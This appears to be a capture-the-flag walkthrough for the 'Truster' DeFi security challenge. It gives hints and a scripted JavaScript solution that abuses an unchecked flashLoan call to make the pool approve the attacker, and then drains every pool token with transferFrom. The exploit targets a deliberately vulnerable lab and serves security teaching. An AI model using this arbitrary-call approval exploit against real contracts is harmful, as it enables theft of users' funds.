# 3 - Truster

### Notes

While the challenge description says “But don't worry, you might be able to take them all from the pool. In a single transaction.” _do not take this to mean that the level can be solved in one single transaction_.

### Hints

<details>

<summary>Hint One</summary>

The `flashLoan` function doesn’t perform any checks on either of the addresses it takes as arguments. Doesn’t that seem a bit dangerous to you?

</details>

<details>

<summary>Hint Two</summary>

What is the `msg.sender` on the function calls `flashLoan` makes to the target address?

</details>

<details>

<summary>Hint Three</summary>

You can pass any value to `borrowAmount` from 0 to the total number of tokens in the pool.

</details>

### Scripted Solution

```javascript
it('Exploit', async function () {
  // Call `flashLoan` with a `data` payload that approves attacker
  await this.pool.flashLoan(
    // uint256 borrowAmount
    0,
    // address borrower
    attacker.address,
    // address target
    this.token.address,
    // bytes calldata data
    this.token.interface.encodeFunctionData('approve', [
      attacker.address,
      TOKENS_IN_POOL
    ])
  )

  // Call `transferFrom` to withdraw all tokens to attacker
  await this.token
    .connect(attacker)
    .transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
})
```
